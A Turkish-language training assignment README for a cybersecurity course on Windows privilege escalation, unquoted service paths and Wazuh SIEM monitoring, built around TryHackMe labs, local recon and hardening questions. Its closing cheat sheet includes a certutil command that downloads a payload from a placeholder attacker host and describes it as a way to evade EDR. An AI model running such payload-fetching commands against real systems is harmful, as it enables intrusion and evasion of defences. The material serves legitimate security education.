# 🦅 Siber Güvenlik Mühendisliği Eğitimi - 2026

> **"Sistemi bilmeyen hackleyemez. Kıracağımız kapının önce kilit mekanizmasını anlamalıyız."**

Bu repo, AnkaCORE '26 eğitim programının **201 Aşaması (Windows Privilege Escalation & Wazuh)** rövanş dersi için hazırlanan zorunlu altyapı görevidir. Geçtiğimiz hafta gerçek dünya operasyonlarının ne kadar ağır olduğunu gördük. Şimdi bir adım geri atıyor, ezbere araç (tool) kullanmayı bırakıyor ve Windows'un derinliklerine iniyoruz.

Bu görev, 201 ders tekrarına gelmeden önce sistemin mimarisini zihninize kazımak için tasarlanmıştır.

---

## 📅 201 HAZIRLIK PROJESİ: "Blueprint & The Watcher"

| Parametre | Detay |
| :--- | :--- |
| **Durum** | 🟡 TAKTİKSEL GERİ ÇEKİLME VE TEMEL İNŞASI |
| **Kapsam** | Windows Mimarisi, Hak Yükseltme Mantığı, EDR/SIEM (Wazuh) |
| **Zorluk Seviyesi** | ⭐⭐⭐⭐ (4/5) |
| **Son Teslim** | 30 Mart Pazartesi 23.59 (Geç Teslim için 31 Mart Salı 23.59)|

---

### 🚀 Görev Özeti

Sektörde Windows Privilege Escalation (Hak Yükseltme) ve SIEM log analizi, "Mid-Level" (Orta Seviye) uzmanların uğraştığı bir cephedir. WinPEAS çalıştırıp ekrana akan renkli yazılara bakarak mühendis olunmaz. Önünüzdeki bu görev iki ana fazdan oluşmaktadır. Sizden beklenen, ders tekrarına gelmeden önce Windows servislerinin nasıl çalıştığını ve bir EDR'ın (Wazuh) bu servisleri nasıl izlediğini teorik ve pratik olarak yutmanızdır.

---

### 📝 FAZ 1: "Sistemin Anatomisi" Operasyon Raporu

Bu faz, aşağıdaki 2 ana bölümden (A ve B) oluşan, analizlerinizi **ekran görüntüleri ile kanıtladığınız**, teknik bir rapor formatında hazırlanmalıdır. CTF zihniyetini bir kenara bırakıp, olayların "Neden" ve "Nasıl" gerçekleştiğine odaklanacaksınız.

**⚠️ Rapor Kuralları:**
1.  **Kanıt Zorunluluğu:** Sadece "Odayı bitirdim" demek geçersizdir. THM odalarındaki kritik mimari yapıları (Örn: Services, Registry) ve Wazuh paneli loglarını incelerken aldığınız ekran görüntülerini rapora mutlaka ekleyin.
2.  **Özgünlük:** İnternetteki tanımları veya ChatGPT metinlerini kopyalamayın. Kendi anladığınız şekilde, bir mühendise anlatır gibi "Neden bu komutu yazdım / Bu log ne anlama geliyor?" diyerek açıklayın.
3.  **Odak Noktası:** Araçların (WinPEAS, LinPEAS vb.) *nasıl* kullanıldığından ziyade, *ne aradıklarına* (arka planda hangi Windows yapılandırmalarını kontrol ettiklerine) odaklanın.

---

#### **Bölüm A: Teori ve Mimari (Research & Logic)**

Hedefe saldırmadan önce hedefi tanımalıyız. Aşağıdaki soruları teknik bir dille ve kendi cümlelerinizle yanıtlayın.

**1. Windows Mimarisi: "Yetki Kimin Elinde?"**
* **Administrator vs. SYSTEM:** Windows'ta `Administrator` yetkisine sahip olmak ile `NT AUTHORITY\SYSTEM` olmak arasında ne fark vardır? Neden Red Team operasyonlarında hedefimiz daima SYSTEM olmaktır?
* **UAC (User Account Control):** Ekrana çıkan o sinir bozucu "Bu uygulamanın cihazınızda değişiklik yapmasına izin veriyor musunuz?" (Evet/Hayır) penceresi arka planda güvenliği nasıl sağlar? UAC Bypass ne anlama gelir?
* **Windows Services (Servisler):** Bilgisayarımız açıldığında arka planda sessizce çalışan servisler (Örn: Windows Update) genellikle hangi yetkiyle çalışır? Bu servislerin çalıştırılabilir dosya yollarındaki bir boşluk (Space) neden güvenlik açığı yaratır? (Unquoted Service Path mantığı).

**2. Mavi Takımın Gözü: "Sessizliği Bozmak"**
* **SIEM / EDR Nedir?** Windows'un halihazırda kendi "Event Viewer" (Olay Görüntüleyicisi) varken, büyük kurumlar neden ağlarına **Wazuh, Splunk** gibi harici SIEM/EDR çözümleri kurmak zorundadır?
* **Gürültülü Araçlar:** WinPEAS veya BloodHound gibi keşif araçlarını bir kurumsal ağda çalıştırdığımızda neden Mavi Takım anında alarm alır? "Gürültülü (Noisy) çalışmak" terimi ne demektir?

---

#### **Bölüm B: Saha Operasyonu (Blueprint Fights)**

Sıra TryHackMe laboratuvarlarında. Hedefimiz ezbere flag toplamak değil, mimariyi okumaktır. Konfor alanınızdan çıkın; aşağıdaki 3 cepheyi **tamamlayıp** çözüm ve analiz adımlarınızı raporlayın.

#### 🛡️ Cephe 1: Sistemin Kalbi (Windows İşletim Sistemi)
* **Hedef:** [TryHackMe: Windows Fundamentals 1 & 2](https://tryhackme.com/module/windows-fundamentals)
* **Görev:** İki odayı da dikkatlice okuyarak tamamlayın. (Özellikle UAC, Services ve Registry kısımları).
* **Beklenti & Raporlama:** * "Task Manager" (Görev Yöneticisi), "Services" (Servisler) ve "Registry" (Kayıt Defteri) bölümlerinin çalışma mantığını kavradığınızı gösterin.
    * Rapora şu sorunun cevabını ekleyin: *"Kayıt defteri (Registry) Windows için neden bu kadar kritiktir ve yanlış bir yetkilendirme (Weak Permissions) bize nasıl hak yükseltme imkanı sunar?"*

#### ⚔️ Cephe 2: Kilit Kırıcı (PrivEsc Mantığı)
* **Hedef:** [TryHackMe: Windows PrivEsc](https://tryhackme.com/room/windowsprivesc20)
* **Görev:** Odanın tamamını çözmenize gerek yok. Ancak **"Service Exploits"** (Özellikle *Unquoted Service Path* ve *Weak Registry Permissions*) başlıklarını dikkatlice okuyup laboratuvar üzerinde uygulayın.
* **Beklenti & Raporlama:**
    * Rapora şu senaryoyu açıklayın: Bir servisin dosya yolunda tırnak işareti olmaması ve yol üzerinde boşluk bulunması (Unquoted Service Path), Windows'un çalıştırılabilir dosyayı ararken nasıl kafasının karışmasına yol açar? 
    * Bu zafiyeti sömürürken kullandığınız komutları ve terminal ekran görüntülerini kendi açıklamanızla kanıtlayın.

#### 👁️ Cephe 3: Nöbetçi Kulesi (Log ve SIEM Temelleri & Wazuh)
* **Senaryo:** Hedef sistemde WinPEAS çalıştırdınız veya yeni bir kullanıcı oluşturdunuz. Mavi takımın ekranına bu hareketler nasıl yansıyor? Görme vakti. Ancak Wazuh paneline bakmadan önce, o panele düşen verinin (Log) ne olduğunu ve SIEM mantığını anlamalısınız.
* **Hedef 1 (Teori):** [TryHackMe: Intro to Logs](https://tryhackme.com/room/introtologs) ve [TryHackMe: Intro to SIEM](https://tryhackme.com/room/introtosiem)
* **Hedef 2 (Pratik):** [TryHackMe: Wazuh](https://tryhackme.com/room/wazuhct) *(Eğer bu oda ağır gelirse platformdaki "Wazuh" aramasıyla çıkan temel seviye odalara bakabilirsiniz)*
* **Görev:** Önce logların ve SIEM'in mantığını kavrayın, ardından Wazuh ajanlarının (Agents) nasıl çalıştığını ve Dashboard (Panel) okumayı öğrenin.
* **Beklenti & Raporlama:**
    * "Log" nedir ve bir SIEM aracı (Örn: Wazuh) farklı kaynaklardan gelen bu logları nasıl merkezileştirir (Centralization)?
    * "Wazuh Agent" hedef Windows makinesine kurulduğunda, topladığı verileri merkez sunucuya (Manager) nasıl iletir? 
    * Bir "Kural (Rule)" tetiklendiğinde Wazuh panelinde bu nasıl görünür? İncelediğiniz loglardan birinin ekran görüntüsünü rapora ekleyerek *"Bu log şu anlama geliyor ve şu kuralı tetiklemiş"* şeklinde detaylıca açıklayın.

---


### 🕵️‍♂️ FAZ 2: Manuel Sistem Analizi ve Vizyon (Local Recon & Mitigation)
*Laboratuvar ortamını (TryHackMe) geride bırakıyoruz. Hazır araçların olmadığı, sadece komut satırının (CMD/PowerShell) olduğu bir dünyadasınız. Artık bir saldırgan değil, sistemini tanıyan bir mühendissiniz.*

Bu fazda, öğrendiğiniz temel "Windows Keşif" (Recon) komutlarını **kendi fiziksel Windows bilgisayarınızda (veya kendi Windows sanal makinenizde)** uygulayacak ve tespitlerinizi profesyonel bir bakış açısıyla yorumlayacaksınız.

---

#### **⚔️ BÖLÜM C: İşletim Sistemi Keşfi (Local Recon Adımları)**

WinPEAS gibi otomatize araçlar kullanmadan, sadece Windows'un yerleşik (built-in) komutlarıyla kendi sisteminizin haritasını çıkarın. İşlemleri CMD (Komut İstemcisi) üzerinden yürütün.

### 🗺️ Cephe 1: Kimlik ve Yetki Haritası
Sisteme girdikten sonra ilk sorumuz "Ben kimim ve ne yapabilirim?" olmalıdır.
* **Operasyon:**
    1. CMD'yi açın ve `whoami /user` komutu ile SID (Security Identifier) numaranızı bulun.
    2. `whoami /priv` komutuyla sahip olduğunuz özel hakları (Privileges) listeleyin.
    3. `net user [Kullanıcı_Adınız]` komutuyla hangi yerel gruplara (Örn: Administrators) üye olduğunuzu kontrol edin.
* **Raporlama:** Çıktıların ekran görüntülerini ekleyin. Bu çıktılara göre sistemde normal bir "User" mısınız yoksa "Administrator" haklarına mı sahipsiniz? Yetkilerinizi açıklayın.

### 💉 Cephe 2: Servis ve Dosya Yolu Analizi
Arka planda çalışan servislerin zayıf yapılandırılması (Misconfiguration), en büyük hak yükseltme kapısıdır.
* **Operasyon:**
    1. Kendi bilgisayarınızda arka planda çalışan bir servis seçin (Örn: `Spooler`, `wuauserv` veya kurduğunuz 3. parti bir uygulamanın servisi).
    2. `sc qc [Servis_Adı]` komutunu çalıştırarak bu servisin yapılandırmasını ekrana dökün.
* **Raporlama:** Ekran görüntüsünü ekleyin. İncelediğiniz servisin `BINARY_PATH_NAME` (Çalıştırılabilir Dosya Yolu) kısmına bakın. Dosya yolunda boşluk (Space) var mı? Eğer boşluk varsa, bu yol tırnak işaretleri (`" "`) arasına alınmış mı? 

### 📋 Cephe 3: Profesyonel Değerlendirme (Security Assessment)
Kendi bilgisayarınızda yaptığınız bu ufak keşif operasyonunu değerlendirin:
* **Bulgular:** Kendi bilgisayarınızda **Unquoted Service Path** (Tırnaksız Servis Yolu) zafiyetine yol açabilecek herhangi bir güvensiz servis tespit ettiniz mi?
* **Sonuç:** Sisteminiz bu spesifik zafiyete karşı güvenli mi yapılandırılmış, yoksa potansiyel bir risk taşıyor mu? Gördüğünüz manzarayı bir Mavi Takım analisti (Savunmacı) gibi raporlayın.

---

#### **🧠 BÖLÜM D: Mühendislik Vizyonu (Reflection)**

*Keşif operasyonunuz bitti. Şimdi klavyeyi bırakıp mimariyi düşünme zamanı.*

Aşağıdaki senaryo sorularına, 201 seviyesinde bir siber güvenlik mühendisi vizyonuyla ve kendi cümlelerinizle cevap verin.

**1. "Yakalanmadan Yükselmek" (Evasion & LOLBAS Mantığı):**
*Senaryo:* Hedef bir şirketin iç ağına sızdınız. Sistemi analiz etmek için dışarıdan indirdiğiniz `winPEAS.exe` dosyasını çalıştırdığınız anda ekranda bir hata aldınız. Şirketin EDR sistemi (Wazuh) zararlı/gürültülü dosyayı engelledi, sildi ve SOC ekibine kırmızı alarm gönderdi.
* **Soru:** Bir Red Team (Kırmızı Takım) uzmanı olarak, WinPEAS gibi dışarıdan ("gürültülü") araç getirmeden, sistemde zafiyet aramaya nasıl devam edersiniz? Sadece Windows'un kendi içinde zaten var olan meşru komutlarını (**LOLBAS** - *Living Off The Land* konsepti) kullanmak neden EDR/Antivirüs sistemlerini atlatmada (Evasion) kritik bir rol oynar? Mantığını açıklayın.

**2. Çözüm Üretmek (Mitigation & Hardening):**
*Senaryo:* Windows Privilege Escalation laboratuvarında zayıf yapılandırılmış bir kayıt defteri anahtarı (Weak Registry Permissions) veya tırnaksız bir servis yolu (Unquoted Service Path) buldunuz ve yetkinizi SYSTEM'e yükselttiniz.
* **Soru:** Bir mühendis olarak, sadece açığı sömürmek yetmez, onu kapatmayı da bilmelisiniz. Bu zafiyeti kökten çözmek için Sistem Yöneticilerine (Sysadmin) nasıl bir talimat (Mitigation) verirsiniz? O servisi veya kayıt defterini nasıl "sıkılaştırmaları" (Hardening) gerekir?

### 📤 Teslim Formatı ve Kontrol Listesi

Bu rapor, rövanş dersine girmeden önce temelinizin sağlam olduğunu kanıtlayacağınız belgedir. Teslim etmeden önce aşağıdaki maddelerin tamamlandığından emin olun. 

* **Dosya Adı:** `Ad_Soyad_201_Hazirlik.pdf`
* **Format ve Uzunluk:** PDF Formatı. (Beklenen ideal uzunluk **5 - 10 Sayfa** arasıdır. Gereksiz laf kalabalığından kaçının, ekran görüntülerini net bir şekilde ekleyin).
* **Sayfa Düzeni ve Kontrol Listesi:**
    * [ ] **Kapak Sayfası:** Eğitim Adı, Proje Adı, Adınız Soyadınız.
    * [ ] **Bölüm A (Teori):** UAC, Administrator vs SYSTEM, Windows Servisleri ve SIEM kavramlarının kendi cümlelerinizle cevapları.
    * [ ] **Bölüm B (Cephe 1 & 2 - Windows & PrivEsc):** Unquoted Service Path mantığı, Registry'nin önemi ve TryHackMe odalarındaki görevlerin ekran görüntüleri (Kanıtlar).
    * [ ] **Bölüm B (Cephe 3 - Wazuh):** "Log ve SIEM nedir?" sorularının cevabı, ajan mantığı ve Wazuh panelinden incelenmiş bir kural (rule) tetiklenme ekran görüntüsü.
    * [ ] **Faz 2 (Local Recon & Vizyon):** Kendi Windows makinenizde yaptığınız yerel keşif çıktıları (`whoami /priv`, `sc qc`), LOLBAS konsepti ve Hardening (Sıkılaştırma) stratejisinin açıklaması.
    
* **Yükleme Adımları:** Kendi GitHub reponuzda oluşturacağınız `201-Hazirlik` klasörüne PDF dosyanızı yükleyip, ana repoya **Pull Request (PR)** açın.

⚠️ **KRİTİK UYARI:**
Bu proje, Ali Ekber Kara'nın bizzat yapacağı 201 ders tekrarına (rövanş maçına) katılabilmeniz için **zorunlu bir ön koşuldur**. Bu temeli atmadan derse gelmek, yine ekrana boş boş bakmak anlamına gelir. Pazartesi günü saat 23.59'a kadar bu görevler tamamlanmalı ve zihinler operasyona hazır hale getirilmelidir.

---

### 📚 İpucu Kutusu (Windows & Savunma Cheat Sheet)

201 operasyonları sırasında sistemin anatomisini okurken ve laboratuvarlarda hayat kurtaracak kritik komutlar / kavramlar:

#### 🖥️ Windows Local Recon (Yerel Keşif)
| Komut / Mantık | Açıklama |
| :--- | :--- |
| `whoami /priv` | Mevcut kullanıcınızın sahip olduğu özel hakları (Privileges) listeler. (Örn: *SeImpersonatePrivilege* varsa sistemde kralsınız demektir). |
| `net user [kullanıcı_adı]` | Belirli bir kullanıcının hangi gruplara üye olduğunu (Örn: Administrators grubu) gösterir. |
| `sc qc [servis_adı]` | "Service Control Query Configuration". Bir servisin nasıl yapılandırıldığını, çalıştırılabilir dosya yolunu ve hangi yetkiyle çalıştığını gösterir. (*Unquoted Service Path* tespiti için altın değerindedir). |
| `icacls [dosya_yolu]` | Bir dosya veya klasör üzerindeki izinleri (Permissions) gösterir. Kimin okuma/yazma/çalıştırma (F, M, RX) yetkisi var buradan anlaşılır. |

#### 🥷 LOLBAS (Dahili Araçlarla Operasyon)
* **`certutil.exe`:** Aslında Windows sertifikalarını yönetmek için kullanılan bu masum araç, Red Team uzmanları tarafından internetten dışarıdan dosya (payload) indirmek için kullanılır. (Örn: `certutil -urlcache -split -f http://hacker-ip/payload.exe`). EDR'ları atlatmak için sıkça tercih edilir.
* **`bitsadmin.exe`:** Windows güncellemelerini arka planda indiren bu araç da tıpkı certutil gibi zararlı dosya çekmek veya komut çalıştırmak için istismar edilebilir.

#### 🛡️ SIEM / Wazuh & Event Log İpuçları
Mavi takımın (Savunmanın) gözünden kaçmamak için log ID'lerini iyi tanımalısınız:
* **Event ID 4688 (Process Creation):** Sistemde yeni bir işlem/komut (Örn: `cmd.exe` veya `winpeas.exe`) çalıştırıldığında Windows Olay Görüntüleyicisi'ne düşen koddur. Wazuh bunu anında yakalar ve alarma çevirir.
* **Event ID 4624 (Successful Logon):** Sisteme başarılı bir giriş yapıldığını gösterir. Parola çalınarak yapılan RDP veya SMB bağlantılarını tespit etmek için incelenir.
* **Kural Seviyesi (Rule Level):** Wazuh'ta alarmların ciddiyet seviyesidir. 0 ile 15 arasındadır. Level 12 ve üzeri genellikle sistemin aktif olarak saldırı altında olduğunu veya kritik bir sistem hatasını gösterir.

**Unutmayın; tetiği çekmeden önce, silahın mekanizmasını öğrenmek zorundayız. Başarılar dileriz.**

*AnkaCORE Operasyon Merkezi* 🦅


